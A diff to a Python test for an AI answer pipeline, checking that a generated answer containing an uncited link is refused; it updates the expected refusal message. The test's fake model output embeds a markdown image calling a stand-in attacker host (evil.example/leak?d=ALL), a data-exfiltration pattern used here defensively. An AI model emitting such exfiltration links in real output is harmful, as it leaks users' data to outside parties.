@@ -108,7 +108,8 @@ def test_link_not_present_in_sources_is_refused_even_if_text_scan_missed_it():
     from butler.retrieval.eval import hybrid_store
     a = answer_question(ME, "Policy reimbursement", hybrid_store(docs)[0], [], KeywordJudge(), AuditLog(),
                         generate=lambda q, ctx: "- [p] Reimbursement takes thirty days. ![x](https://evil.example/leak?d=ALL)")
-    assert a.status == "citation_failed" and a.text == UNVERIFIED
+    from butler.answer.messages import msg
+    assert a.status == "citation_failed" and a.text == msg("unverified", "Policy reimbursement")
 
 
 def test_model_metadata_reports_generalisation_honestly():
